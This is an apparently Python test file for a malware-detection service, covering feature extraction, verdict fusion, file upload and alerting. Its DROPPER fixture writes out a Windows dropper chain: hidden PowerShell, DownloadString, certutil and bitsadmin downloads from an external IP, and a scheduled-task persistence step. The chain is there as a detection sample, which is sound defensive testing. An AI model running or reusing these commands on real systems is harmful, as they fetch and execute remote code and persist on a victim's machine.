"""Milestone 2: feature extraction, verdict fusion, pipeline, alerts."""

import io

import numpy as np
from fastapi.testclient import TestClient

from app.main import app
from app.ml.features.extractor import FEATURE_COUNT, FEATURE_NAMES, extract_features
from app.ml.models.registry import get_detector
from app.modules.alerts.service import AlertsService
from app.modules.file_analysis.schemas import MLPrediction
from app.modules.file_analysis.service import file_analysis_service
from app.modules.pipeline.fusion import fuse

client = TestClient(app)

PE_BYTES = b"MZ" + b"\x00" * 0x3A + (0x40).to_bytes(4, "little") + b"PE\x00\x00" + b"\x00" * 200
DROPPER = (
    b"powershell -nop -w hidden -enc AAAA; "
    b"IEX (New-Object Net.WebClient).DownloadString('http://45.147.230.112/a.ps1'); "
    b"cmd.exe /c certutil -urlcache -f http://45.147.230.112/b b & "
    b"bitsadmin /transfer j http://45.147.230.112/c c & schtasks /create /tn p /tr b"
)


def _headers(email="analyst@local"):
    tok = client.post("/api/v1/auth/login", json={"email": email, "password": "x"}).json()[
        "access_token"
    ]
    return {"Authorization": f"Bearer {tok}"}


# --- feature extractor ------------------------------------------------------

def test_feature_vector_shape_and_finiteness():
    for data in (b"", b"hello world " * 50, PE_BYTES, DROPPER):
        v = extract_features(data)
        assert v.shape == (FEATURE_COUNT,)
        assert v.dtype == np.float32
        assert np.isfinite(v).all()


def test_feature_vector_is_deterministic():
    assert np.array_equal(extract_features(DROPPER), extract_features(DROPPER))


def test_analysis_signals_feed_features():
    analysis = {
        "risk": {"score": 90},
        "signature_match": {"matched": True},
        "yara_matches": [{"meta": {"severity": "high", "family": "Downloader"}}],
        "network_indicators": {"urls": ["a", "b"], "ips": ["1.2.3.4"], "domains": []},
        "suspicious_strings": ["x"],
        "metadata": {"likely_packed": True, "extension_matches_content": False},
    }
    v = extract_features(DROPPER, analysis)
    assert v[FEATURE_NAMES.index("sa_risk_score")] == np.float32(0.9)
    assert v[FEATURE_NAMES.index("sa_signature_matched")] == 1.0
    assert v[FEATURE_NAMES.index("sa_yara_high")] == 1.0


# --- fusion ----------------------------------------------------------------

def _static(data, name="s"):
    return file_analysis_service.analyze_static_file(name, data)


def test_fusion_rules_only_when_ml_unavailable():
    result = _static(DROPPER, "d.ps1")
    verdict = fuse(result, MLPrediction(available=False))
    assert verdict.level == "high"  # driven by static rules alone
    assert verdict.agreement == "rules-only"
    assert verdict.sources["ml_available"] is False


def test_fusion_agrees_when_both_flag():
    result = _static(DROPPER, "d.ps1")
    ml = MLPrediction(available=True, applicable=True, malicious=True, malware_probability=0.95,
                      category="trojan", category_confidence=0.8, model_versions={"detector": "t"})
    verdict = fuse(result, ml)
    assert verdict.level == "high"
    assert verdict.agreement == "agree"
    assert verdict.score >= 80


def test_fusion_ml_only_when_model_flags_clean_looking_file():
    clean = _static(b"MZ" + b"\x00" * 400, "sample.exe")  # PE-ish, no static signals
    assert clean.risk.level == "low"
    ml = MLPrediction(available=True, applicable=True, malicious=True, malware_probability=0.97,
                      model_versions={})
    verdict = fuse(clean, ml)
    assert verdict.agreement == "ml-only"
    assert verdict.level in ("medium", "high")


def test_fusion_non_pe_ml_does_not_count():
    result = _static(DROPPER, "d.ps1")  # script -> ML not applicable
    ml = MLPrediction(available=True, applicable=False, malicious=False, malware_probability=0.02,
                      model_versions={})
    verdict = fuse(result, ml)
    assert verdict.level == "high"  # rule engine still drives it
    assert verdict.agreement == "rules-only"


# --- pipeline endpoint ---------------------------------------------------

def test_upload_runs_full_pipeline():
    resp = client.post(
        "/api/v1/files/upload",
        files={"file": ("dropper.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=_headers(),
    )
    assert resp.status_code == 201
    body = resp.json()
    assert body["verdict"] is not None
    assert body["ml"] is not None
    assert body["verdict"]["label"] in ("malicious", "suspicious", "benign")
    assert "static_risk_score" in body["verdict"]["sources"]


def test_model_info_endpoint():
    resp = client.get("/api/v1/malware/model", headers=_headers())
    assert resp.status_code == 200
    assert resp.json()["feature_count"] == FEATURE_COUNT


def test_detections_and_alerts_populate_after_scan():
    client.post(
        "/api/v1/files/upload",
        files={"file": ("dropper2.bin", io.BytesIO(DROPPER), "application/octet-stream")},
        headers=_headers(),
    )
    dets = client.get("/api/v1/threats/detections", headers=_headers("soc@local"))
    assert dets.status_code == 200
    assert len(dets.json()) >= 1

    alerts = client.get("/api/v1/alerts/", headers=_headers("soc@local"))
    assert alerts.status_code == 200


# --- alert service (unit) ---------------------------------------------

def test_alert_generation_and_dedupe():
    svc = AlertsService()
    result = _static(DROPPER, "d.ps1")
    result.verdict = fuse(result, MLPrediction(available=False))

    a1 = svc.evaluate(result)
    assert a1 is not None and a1.status == "open"
    a2 = svc.evaluate(result)  # same sample -> same alert
    assert a2 is a1
    assert len(svc.list_alerts()) == 1


def test_low_verdict_raises_no_alert():
    svc = AlertsService()
    clean = _static(b"hello, this is a plain and boring text file", "n.txt")
    clean.verdict = fuse(clean, MLPrediction(available=False))
    assert svc.evaluate(clean) is None


def test_incident_creation_links_alerts():
    svc = AlertsService()
    r = _static(DROPPER, "d.ps1")
    r.verdict = fuse(r, MLPrediction(available=False))
    alert = svc.evaluate(r)
    inc = svc.create_incident([alert.id], title="Campaign X")
    assert inc is not None
    assert alert.id in inc.alert_ids
    assert svc.get(alert.id).incident_id == inc.id


def test_model_is_optional():
    # the pipeline must work whether or not a trained model is present
    d = get_detector()
    assert d is None or d.feature_names  # loads cleanly if present
